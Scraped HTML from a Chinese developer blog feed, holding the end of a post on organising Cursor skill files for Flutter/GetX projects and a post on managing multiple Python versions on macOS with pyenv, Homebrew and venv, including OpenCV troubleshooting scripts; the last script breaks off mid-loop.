<span class="hljs-string">这个我有强迫症，必须这么排：</span>
<span class="hljs-string">​</span>
<span class="hljs-string">```dart</span>
<span class="hljs-string">//</span> <span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">dart</span> <span class="hljs-string">自带的</span>
<span class="hljs-string">import</span> <span class="hljs-string">'dart:async'</span><span class="hljs-string">;</span>
<span class="hljs-string">​</span>
<span class="hljs-string">//</span> <span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">flutter</span> <span class="hljs-string">的</span>
<span class="hljs-string">import</span> <span class="hljs-string">'package:flutter/material.dart'</span><span class="hljs-string">;</span>
<span class="hljs-string">​</span>
<span class="hljs-string">//</span> <span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">第三方包</span>
<span class="hljs-string">import</span> <span class="hljs-string">'package:get/get.dart'</span><span class="hljs-string">;</span>
<span class="hljs-string">​</span>
<span class="hljs-string">//</span> <span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">自己项目的</span>
<span class="hljs-string">import</span> <span class="hljs-string">'../services/api.dart'</span><span class="hljs-string">;</span>
</code></pre>
<p>中间空一行分隔，看着舒服。</p>
<h3 data-id="heading-5">GetX Controller 怎么写</h3>
<p>我们项目用 GetX，controller 这么写：</p>
<pre><code class="hljs language-ini" lang="ini">class UserController extends GetxController {
  final <span class="hljs-attr">_loading</span> = <span class="hljs-literal">false</span>.obs<span class="hljs-comment">;</span>
  bool get <span class="hljs-attr">loading</span> =&gt; _loading.value<span class="hljs-comment">;</span>
​
  final <span class="hljs-attr">_user</span> = Rxn&lt;User&gt;()<span class="hljs-comment">;</span>
  User? get <span class="hljs-attr">user</span> =&gt; _user.value<span class="hljs-comment">;</span>
​
  Future&lt;void&gt; loadUser() async {
    <span class="hljs-attr">_loading.value</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
    try {
      <span class="hljs-attr">_user.value</span> = await api.getUser()<span class="hljs-comment">;</span>
    } finally {
      <span class="hljs-attr">_loading.value</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }
  }
}
</code></pre>
<p>注意几点：</p>
<ul>
<li>私有变量用下划线</li>
<li>对外暴露 getter</li>
<li>loading 状态别忘了 finally 里关掉</li>
</ul>
<h3 data-id="heading-6">页面结构</h3>
<pre><code class="hljs language-scss" lang="scss">class UserPage extends StatelessWidget {
  const <span class="hljs-built_in">UserPage</span>({super.key});
​
  <span class="hljs-keyword">@override</span>
  Widget build(BuildContext context) {
    return GetBuilder&lt;UserController&gt;(
      init: UserController(),
      builder: (c) =&gt; <span class="hljs-built_in">Scaffold</span>(
        appBar: <span class="hljs-built_in">AppBar</span>(title: const <span class="hljs-built_in">Text</span>(<span class="hljs-string">'用户'</span>)),
        body: <span class="hljs-built_in">Obx</span>(() {
          if (c.loading) {
            return const Center(child: CircularProgressIndicator());
          }
          return <span class="hljs-built_in">_buildContent</span>(c);
        }),
      ),
    );
  }
​
  Widget <span class="hljs-built_in">_buildContent</span>(UserController c) {
    <span class="hljs-comment">// 内容</span>
  }
}
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">​</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">## 高级玩法：文件拆分</span>
<span class="hljs-string">​</span>
<span class="hljs-string">技能写多了之后，一个文件塞不下了。而且每次</span> <span class="hljs-string">AI</span> <span class="hljs-string">都要读整个文件，Token</span> <span class="hljs-string">哗哗的烧。</span>
<span class="hljs-string">​</span>
<span class="hljs-string">这时候就要拆分。</span>
<span class="hljs-string">​</span>
<span class="hljs-string">**目录结构**：</span>
</code></pre>
<p>~/.cursor/skills/flutter-pro/<br/>
├── SKILL.md # 主文件，放最常用的<br/>
├── getx.md # GetX 详细用法<br/>
├── api.md # 网络请求规范<br/>
└── widgets.md # 组件规范<br/></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">​</span>
<span class="hljs-string">**SKILL.md</span> <span class="hljs-string">里这么写**：</span>
<span class="hljs-string">​</span>
<span class="hljs-string">```markdown</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">flutter-pro</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Flutter</span> <span class="hljs-string">开发完整规范。写代码、搞状态管理、调接口的时候用。</span>
<span class="hljs-meta">---</span>
<span class="hljs-string">​</span>
<span class="hljs-comment"># Flutter 开发</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">## 快速参考</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">### 状态管理</span>
<span class="hljs-string">用</span> <span class="hljs-string">GetX。详细的看</span> [<span class="hljs-string">getx.md</span>]<span class="hljs-string">(getx.md)</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">### 网络请求  </span>
<span class="hljs-string">用</span> <span class="hljs-string">Dio</span> <span class="hljs-string">+</span> <span class="hljs-string">拦截器。详细的看</span> [<span class="hljs-string">api.md</span>]<span class="hljs-string">(api.md)</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">### 组件开发</span>
<span class="hljs-string">const</span> <span class="hljs-string">构造、StatelessWidget</span> <span class="hljs-string">优先。详细的看</span> [<span class="hljs-string">widgets.md</span>]<span class="hljs-string">(widgets.md)</span>
<span class="hljs-string">​</span>
<span class="hljs-comment">## 最常用的代码</span>
<span class="hljs-string">​</span>
<span class="hljs-string">（这里放几个最常用的模板）</span>
</code></pre>
<p>这样 AI 平时只读主文件，需要详细信息的时候才去读子文件。省 Token。</p>
<hr/>
<h3 data-id="heading-7">省 Token 的一些心得</h3>
<p>用了一段时间，总结了几个省钱技巧：</p>
<h4 data-id="heading-8">1. 别写废话</h4>
<p>AI 比你想象的聪明。什么是 StatelessWidget、什么是 const，它都知道。你只需要告诉它"用 const"就行了，不用解释为什么。</p>
<p><strong>别这样</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">## 关于 <span class="hljs-type">const</span> 关键字

<span class="hljs-type">const</span> 是 Dart 中的编译时常量关键字。使用 <span class="hljs-type">const</span> 可以让 Flutter 在编译时就确定 Widget 的值，从而优化性能。当 Widget 的所有属性都是编译时常量时，应该使用 <span class="hljs-type">const</span>...
</code></pre>
<p><strong>这样就够了</strong>：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta">## 规矩</span>
- 构造函数加 <span class="hljs-keyword">const</span>
- 能 <span class="hljs-keyword">const</span> 的 Widget 都 <span class="hljs-keyword">const</span>
</code></pre>
<h4 data-id="heading-9">2. 用模板代替解释</h4>
<p>与其写一大段"表单验证应该怎么做"，不如直接贴个模板：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">TextFormField</span>(
  <span class="hljs-attr">validator</span>: <span class="hljs-function">(<span class="hljs-params">v</span>) =&gt;</span> v!.<span class="hljs-property">isEmpty</span> ? <span class="hljs-string">'必填'</span> : <span class="hljs-literal">null</span>,
  <span class="hljs-attr">decoration</span>: <span class="hljs-keyword">const</span> <span class="hljs-title class_">InputDecoration</span>(<span class="hljs-attr">labelText</span>: <span class="hljs-string">'用户名'</span>),
)
</code></pre>
<p>代码就是最好的文档。</p>
<h4 data-id="heading-10">3. 渐进式披露</h4>
<p>主文件放最常用的 20%，剩下 80% 拆到子文件。AI 需要的时候自己会去读。</p>
<hr/>
<h3 data-id="heading-11">我现在的配置</h3>
<p>分享一下我自己的配置，给你参考：</p>
<p><strong>个人目录</strong>（<code>~/.cursor/skills/</code>）：</p>
<ul>
<li><code>dart-style/</code> - Dart 代码风格（命名、注释这些）</li>
<li><code>git-msg/</code> - Git commit 信息格式</li>
</ul>
<p><strong>项目目录</strong>（<code>.cursor/skills/</code>）：</p>
<ul>
<li><code>project-api/</code> - 项目的 API 接口规范</li>
<li><code>project-db/</code> - 本地数据库操作规范</li>
</ul>
<p>这样分的好处是：换个项目，个人偏好还在，项目相关的配置跟着项目走。</p>
<hr/>
<h3 data-id="heading-12">一些坑</h3>
<h4 data-id="heading-13">技能没生效？</h4>
<p>检查一下：</p>
<ol start="0">
<li><code>description</code> 写得够不够具体</li>
<li>文件名是不是 <code>SKILL.md</code>（大小写敏感）</li>
<li>yaml 格式有没有写错（冒号后面要有空格）</li>
</ol>
<h4 data-id="heading-14">Skills 和 Rules 有啥区别？</h4>
<p>Rules 是每次对话都会加载的，Skills 是按需加载的。</p>
<p>所以：</p>
<ul>
<li>简单的、每次都要用的偏好 → 放 Rules</li>
<li>复杂的、特定场景才用的 → 放 Skills</li>
</ul>
<hr/>
<h3 data-id="heading-15">最后</h3>
<p>这功能我觉得挺值得花时间配置的。一次配置，后面省很多事。</p>
<p>刚开始别贪多，先搞一个最简单的，比如 Widget 规范。用顺了再慢慢加。</p>
<p>有问题欢迎交流。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在Mac上优雅管理Python多版本：从安装到疑难排错全攻略]]></title>    <link>https://juejin.cn/post/7603160727717904435</link>    <guid>https://juejin.cn/post/7603160727717904435</guid>    <pubDate>2026-02-05T09:27:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727717904435" data-draft-id="7602982045138534446" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在Mac上优雅管理Python多版本：从安装到疑难排错全攻略"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-05T09:27:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="leafyyuki"/> <meta itemprop="url" content="https://juejin.cn/user/2172290706728829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在Mac上优雅管理Python多版本：从安装到疑难排错全攻略
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2172290706728829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    leafyyuki
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:27:09.000Z" title="Thu Feb 05 2026 09:27:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2026年2月5日 · 10分钟阅读</p>
</blockquote>
<p>作为Python开发者，在Mac上管理多个Python版本是一项必备技能。无论是为了兼容老项目，还是尝试新特性，掌握多版本管理都能让你事半功倍。本文将带你从基础安装到高级排错，一站式解决所有问题。</p>
<h2 data-id="heading-0">为什么需要多版本Python？</h2>
<ul>
<li><strong>项目兼容性</strong>：不同项目依赖不同Python版本</li>
<li><strong>新特性尝鲜</strong>：想用Python 3.11的新功能，但生产环境还在3.8</li>
<li><strong>学习测试</strong>：验证代码在不同版本的兼容性</li>
<li><strong>依赖隔离</strong>：避免包冲突，保持环境干净</li>
</ul>
<h2 data-id="heading-1">方法一：pyenv - 专业开发者的首选</h2>
<h3 data-id="heading-2">安装与配置</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 通过Homebrew安装</span>
brew update
brew install pyenv

<span class="hljs-comment"># 配置Shell环境（添加到~/.zshrc或~/.bash_profile）</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.pyenv/bin:<span class="hljs-variable">$PATH</span>"</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(pyenv init --path)</span>"</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(pyenv init -)</span>"</span>
</code></pre>
<h3 data-id="heading-3">常用命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看可安装版本</span>
pyenv install --list

<span class="hljs-comment"># 安装指定版本</span>
pyenv install 3.9.7
pyenv install 3.11.4

<span class="hljs-comment"># 查看已安装版本</span>
pyenv versions

<span class="hljs-comment"># 设置全局版本</span>
pyenv global 3.11.4

<span class="hljs-comment"># 设置局部版本（当前目录）</span>
pyenv <span class="hljs-built_in">local</span> 3.9.7

<span class="hljs-comment"># 设置临时版本（当前会话）</span>
pyenv shell 3.10.0
</code></pre>
<h3 data-id="heading-4">虚拟环境管理</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装虚拟环境插件</span>
brew install pyenv-virtualenv

<span class="hljs-comment"># 创建虚拟环境</span>
pyenv virtualenv 3.11.4 myproject-env

<span class="hljs-comment"># 激活虚拟环境</span>
pyenv activate myproject-env

<span class="hljs-comment"># 退出虚拟环境</span>
pyenv deactivate
</code></pre>
<h2 data-id="heading-5">方法二：Homebrew - 简单直接</h2>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 安装Python</span>
brew install python
brew install python@3.<span class="hljs-number">8</span>
brew install python@3.<span class="hljs-number">9</span>

<span class="hljs-comment"># 切换版本</span>
brew <span class="hljs-keyword">link</span> --overwrite python@3.<span class="hljs-number">9</span>
</code></pre>
<h2 data-id="heading-6">方法三：官方安装包 + 虚拟环境</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建虚拟环境</span>
python3.9 -m venv myenv
<span class="hljs-built_in">source</span> myenv/bin/activate

<span class="hljs-comment"># 安装依赖</span>
pip install -r requirements.txt
</code></pre>
<h2 data-id="heading-7">版本管理对比表</h2>





























<table><thead><tr><th>工具</th><th>优点</th><th>缺点</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>pyenv</strong>​</td><td>版本隔离好，切换灵活</td><td>学习曲线稍陡</td><td>需要多个版本频繁切换</td></tr><tr><td><strong>Homebrew</strong>​</td><td>安装简单，更新方便</td><td>版本管理相对有限</td><td>主要使用最新版本</td></tr><tr><td><strong>官方安装包</strong>​</td><td>官方支持，稳定可靠</td><td>多版本管理麻烦</td><td>需要官方稳定版本</td></tr></tbody></table>
<h2 data-id="heading-8">常见问题与解决方案</h2>
<h3 data-id="heading-9">Q1: 如何查看当前Python版本？</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看默认Python版本</span>
python --version

<span class="hljs-comment"># 查看Python3版本</span>
python3 --version

<span class="hljs-comment"># 查看所有已安装版本（pyenv）</span>
pyenv versions

<span class="hljs-comment"># 查看Python路径</span>
<span class="hljs-built_in">which</span> python
<span class="hljs-built_in">which</span> python3
</code></pre>
<h3 data-id="heading-10">Q2: 安装OpenCV时遇到<code>No matching distribution found for cv2</code></h3>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">pip install cv2
ERROR: Could <span class="hljs-keyword">not</span> find a version that satisfies the requirement cv2
</code></pre>
<p><strong>原因分析</strong>：</p>
<p>OpenCV的Python包名是<code>opencv-python</code>，不是<code>cv2</code>。<code>cv2</code>是导入时使用的模块名。</p>
<p><strong>正确安装方法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基础版本（最常用）</span>
pip install opencv-python

<span class="hljs-comment"># 包含额外模块的完整版</span>
pip install opencv-contrib-python

<span class="hljs-comment"># 无GUI版本（服务器使用）</span>
pip install opencv-python-headless
</code></pre>
<h3 data-id="heading-11">Q3: 运行脚本时出现<code>segmentation fault</code></h3>
<p><strong>错误信息</strong>：</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">1</span>] <span class="hljs-number">2887</span> segmentation fault python batch_process_urls.py
</code></pre>
<p><strong>可能原因</strong>：</p>
<ol>
<li>Python与OpenCV的ABI不兼容</li>
<li>M1/M2芯片的架构问题</li>
<li>多个OpenCV版本冲突</li>
<li>NumPy版本不兼容</li>
</ol>
<p><strong>解决方案</strong>：</p>
<h4 data-id="heading-12">方案A：完全清理重装</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 卸载所有相关包</span>
pip uninstall -y opencv-python opencv-contrib-python opencv-python-headless
pip uninstall -y numpy

<span class="hljs-comment"># 清理缓存</span>
pip cache purge

<span class="hljs-comment"># 重新安装稳定版本组合</span>
pip install <span class="hljs-attr">numpy</span>==<span class="hljs-number">1.24</span>.<span class="hljs-number">0</span>
pip install <span class="hljs-attr">opencv-python</span>==<span class="hljs-number">4.8</span>.<span class="hljs-number">1.78</span>
</code></pre>
<h4 data-id="heading-13">方案B：针对M1/M2芯片</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用Miniforge</span>
conda create -n cv_env <span class="hljs-attr">python</span>=<span class="hljs-number">3.9</span>
conda activate cv_env
conda install -c conda-forge opencv numpy
</code></pre>
<h4 data-id="heading-14">方案C：使用虚拟环境隔离</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建全新虚拟环境</span>
python -m venv opencv_env
source opencv_env/bin/activate

<span class="hljs-comment"># 安装指定版本</span>
pip install <span class="hljs-attr">numpy</span>==<span class="hljs-number">1.24</span>.<span class="hljs-number">0</span>
pip install <span class="hljs-attr">opencv-python</span>==<span class="hljs-number">4.8</span>.<span class="hljs-number">1.78</span>
</code></pre>
<h3 data-id="heading-15">Q4: 特定操作导致段错误（如cv2.imdecode）</h3>
<p><strong>问题定位</strong>：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 错误发生在解码图片时</span>
<span class="hljs-attr">img</span> = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
</code></pre>
<p><strong>安全解码函数</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_imdecode</span>(<span class="hljs-params">image_array, flags=cv2.IMREAD_COLOR, retries=<span class="hljs-number">3</span></span>):
    <span class="hljs-string">"""安全地解码图片，防止段错误"""</span>
    <span class="hljs-keyword">if</span> image_array <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(image_array, np.ndarray):
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        
    <span class="hljs-keyword">if</span> image_array.size == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-comment"># 确保是uint8类型</span>
    <span class="hljs-keyword">if</span> image_array.dtype != np.uint8:
        <span class="hljs-keyword">try</span>:
            image_array = image_array.astype(np.uint8)
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-comment"># 尝试解码</span>
    <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(retries):
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 确保数组连续</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> image_array.flags[<span class="hljs-string">'C_CONTIGUOUS'</span>]:
                image_array = np.ascontiguousarray(image_array)
                
            img = cv2.imdecode(image_array, flags)
            <span class="hljs-keyword">if</span> img <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                <span class="hljs-keyword">return</span> img
                
        <span class="hljs-keyword">except</span> Exception:
            <span class="hljs-keyword">continue</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<h3 data-id="heading-16">Q5: pyenv版本切换不生效</h3>
<p><strong>检查步骤</strong>：</p>
<ol>
<li>确认已正确配置Shell环境</li>
<li>查看版本优先级：<code>pyenv version</code></li>
<li>检查当前目录是否有<code>.python-version</code>文件</li>
<li>重新加载配置：<code>exec $SHELL</code></li>
</ol>
<p><strong>解决命令</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看当前生效版本</span>
pyenv version

<span class="hljs-comment"># 查看版本优先级</span>
pyenv versions

<span class="hljs-comment"># 设置全局版本</span>
pyenv global 3.11.4

<span class="hljs-comment"># 重新初始化</span>
pyenv <span class="hljs-built_in">rehash</span>
</code></pre>
<h2 data-id="heading-17">实用脚本集合</h2>
<h3 data-id="heading-18">1. Python环境诊断脚本</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> platform
<span class="hljs-keyword">import</span> subprocess

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Python环境诊断报告"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Python版本: <span class="hljs-subst">{sys.version}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"平台信息: <span class="hljs-subst">{platform.platform()}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"处理器: <span class="hljs-subst">{platform.processor()}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"可执行文件: <span class="hljs-subst">{sys.executable}</span>"</span>)

<span class="hljs-comment"># 检查关键包</span>
packages = [<span class="hljs-string">'numpy'</span>, <span class="hljs-string">'opencv-python'</span>, <span class="hljs-string">'pandas'</span>, <span class="hljs-string">'matplotlib'</span>]
<span class="hljs-keyword">for</span> pkg <span class="hljs-keyword">in</span> packages:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">import</span> importlib
        version = importlib.metadata.version(pkg)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{pkg}</span>: <span class="hljs-subst">{version}</span>"</span>)
    <span class="hljs-keyword">except</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{pkg}</span>: 未安装"</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
</code></pre>
<h3 data-id="heading-19">2. 一键修复OpenCV脚本</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># fix_opencv.sh</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"开始修复OpenCV环境..."</span>

<span class="hljs-comment"># 备份当前环境</span>
pip freeze &gt; requirements_backup.txt

<span class="hljs-comment"># 清理问题包</span>
pip uninstall -y opencv-python opencv-contrib-python
pip uninstall -y numpy
pip cache purge

<span class="hljs-comment"># 创建新环境</span>
python -m venv opencv_fixed
<span class="hljs-built_in">source</span> opencv_fixed/bin/activate

<span class="hljs-comment"># 安装稳定版本</span>
pip install --upgrade pip
pip install numpy==1.24.0
pip install opencv-python==4.8.1.78

<span class="hljs-comment"># 验证安装</span>
python -c <span class="hljs-string">"
import cv2
import numpy as np
print(f'✅ OpenCV {cv2.__version__}')
print(f'✅ NumPy {np.__version__}')
"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"修复完成！激活环境: source opencv_fixed/bin/activate"</span>
</code></pre>
<h3 data-id="heading-20">3. 多版本测试脚本</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># test_multiple_versions.py</span>

test_code = <span class="hljs-string">"""
import sys
print(f'Python {sys.version_info.major}.{sys.version_info.minor}')
import numpy as np
print(f'NumPy {np.__version__}')
try:
    import cv2
    print(f'OpenCV {cv2.__version__}')
except:
    print('OpenCV导入失败')
"""</span>

<span class="hljs-comment"># 在多个Python版本中运行测试</span>
versions = [<span class="hljs-string">'python3.8'</span>, <span class="hljs-string">'python3.9'</span>, <span class="hljs-string">'python3.10'</span>, <span class="hljs-string">'python3.11'</span>]

<span class="hljs-keyword">for</span> version <span class="hljs-keyword">in</span> versions:
